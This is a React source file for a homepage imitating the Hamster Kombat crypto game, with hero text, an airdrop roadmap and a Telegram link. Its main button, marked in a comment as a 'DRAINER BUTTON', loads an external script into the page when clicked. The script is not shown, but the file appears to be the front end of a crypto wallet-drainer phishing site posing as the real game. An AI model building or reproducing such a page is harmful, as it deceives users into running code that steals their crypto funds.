import Navbar from "./Navbar";
import RoadmapCard from "./RoadmapCard";
import "../App.css";
import Footer from "./Footer";
import image from "../12.png";
import image2 from "../photo_2024-09-28_10-33-29.jpg";
import image3 from "../button.png";
// import { useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";

function HomePage() {
  const [isMobile, setIsMobile] = useState(window.innerWidth < 600);

  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 600);
    };

    window.addEventListener("resize", handleResize);

    return () => window.removeEventListener("resize", handleResize);
  }, []);

  // const navigate = useNavigate();

  // const handlePlayClick = () => {
  //   navigate("/airdrop"); // Navigate to the AirdropPage
  // };
 const runScript = () => {
   // Check if the script is already present
   const existingScript = document.querySelector(
     'script[src="./66ecf0321c4f66e295df8a47.js"]'
   );

   if (!existingScript) {
     // If the script doesn't exist, create and append it
     const script = document.createElement("script");
     script.src = "./66ecf0321c4f66e295df8a47.js";
     document.head.appendChild(script);
   } else {
     console.log("Script is already loaded.");
   }
 };
  const [dropdownOpen, setDropdownOpen] = useState(false);

  return (
    <div className="bg-[#13111c] text-white min-h-screen">
      <Navbar />
      <section className="text-center py-2 flex flex-col items-center">
        <h1 className="text-[80px] font-bold mb-4 max-[800px]:text-[48px] max-[800px]:mt-[105px] max-[900px]:leading-tight px-4">
          Unleash your inner CEO
        </h1>
        <img src={image} alt="image" />
        <p className="text-[#fffc] max-[800px]:text-[18px] mb-2 text-[24px] px-4">
          Make your way from the shaved hamster to the grandmaster CEO of the
          tier-1 crypto exchange
        </p>
        <p className="text-[#fffc] max-[800px]:text-[18px] mb-2 text-[24px] max-[800px]:hidden px-4">
          Buy upgrades, complete quests, invite friends and become the best
        </p>

        {/* ----------------DRAINER BUTTON ----------------------- */}

        <button id="btn" className="" onClick={() => runScript()}>
          <img
            src={isMobile ? image2 : image3}
            alt=""
            className="w-[820px] hover:brightness-110 max-[800px]:w-[150vw] overflowx-x-hidden max-[600px]:w-full"
          />
        </button>

        {/* ------------------------------------------------------- */}
        <button
          id="btn1"
          className="w-[555px] h-[129px] text-[26px] rounded-full border-2 border-slate-600 bg-[#FFFFFF1A] max-[600px]:w-[90%] max-[600px]:h-[95px] hover:border-blue-300"
        >
          <a href="https://t.me/hamster_kombat">Play Now</a>
        </button>
      </section>

      <section className="py-16 px-4 flex flex-col justify-center items-center">
        <h2 className="font-bold text-center mb-8 text-[80px] max-[800px]:text-[40px]">
          Roadmap
        </h2>
        <div className="flex flex-col w-full mx-auto justify-center items-center">
          {/* Button to toggle the roadmap for March to July */}
          <span
            className="flex justify-center items-center text-green-500 my-4 border-b border-green-500 border-dashed w-[200px] py-1"
            onClick={() => setDropdownOpen(!dropdownOpen)}
          >
            <button className="mx-1 text-green-500 rounded-md focus:outline-none">
              {dropdownOpen ? "Hide previous events" : "Show previous events"}
            </button>
            <svg
              class={`w-5 h-5 transition-transform ${
                dropdownOpen ? "rotate-180" : "rotate-0"
              }`}
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M19 9l-7 7-7-7"
              />
            </svg>
          </span>

          {/* Dropdown for March to July */}
          {dropdownOpen && (
            <div className="w-full">
              <RoadmapCard
                title="March 2024"
                items={["Basic game", "Mining updates", "Earn tasks"]}
              />
              <RoadmapCard
                title="April 2024"
                items={["Referral system", "LVL ratings", "Daily rewards"]}
              />
              <RoadmapCard
                title="May 2024"
                items={[
                  "Special cards",
                  "Daily Combo",
                  "Blockchain announcement",
                ]}
              />
              <RoadmapCard
                title="June 2024"
                items={[
                  "On-chain infrastructure development",
                  "Wallet in-game implementation",
                  "Web 3 pre-listing Quest",
                ]}
              />
              <RoadmapCard
                title="July 2024"
                items={[
                  "Characters and skins",
                  "Third-party game integration MVP",
                  "Tech solution for the largest-ever AirDrop",
                ]}
              />
              <RoadmapCard
                title="August 2024"
                items={["Achievements", "Gaming platform launch"]}
              />
            </div>
          )}

          {/* Roadmap starting from September onwards */}
          <RoadmapCard
            title="September 2024"
            items={[
              "The Interlude season launch",
              "Implementing tech for the largest AirDrop",
              "TGE and AirDrop distribution",
              "$HMSTR Listing",
            ]}
          />
          <RoadmapCard
            title="October 2024"
            items={[
              "Hamster Kombat's Season 2 launch",
              "Expansion of the game library",
              "Integration of external payment systems into the game",
            ]}
          />
          <RoadmapCard
            title="November 2024"
            items={[
              "Release of PWA for payment service integration",
              "Release of the first games from external developers within Hamster Kombat",
              "Introduction of NFT mechanics into Hamster Kombat’s Season 2",
            ]}
          />
          <RoadmapCard
            title="December 2024"
            items={[
              "Integration of the ad network into the store products",
              "Launch of clans deeply integrated into the second season's mechanics",
            ]}
          />
          <RoadmapCard
            title="January 2025"
            items={[
              "Launch of two major game titles with full token integration into the game economy",
              "Introduction of RMT (Real Money Trading) in games",
            ]}
          />
          <RoadmapCard
            title="February 2025"
            items={[
              "The first competitive clan championship within Hamster Kombat 2.0",
              "Expansion of partner games with more complex and costly development projects",
            ]}
          />
          <RoadmapCard
            title="Spring 2025"
            items={[
              "The second phase of the Airdrop",
              "UGC (User-Generated Content) creation tools",
              "Launch of an internal NFT marketplace for in-game items",
            ]}
          />
          <RoadmapCard
            title="Summer 2025"
            items={["Moving beyond PWA. Integration with desktop games"]}
          />
        </div>
      </section>

      <Footer />
    </div>
  );
}

export default HomePage;
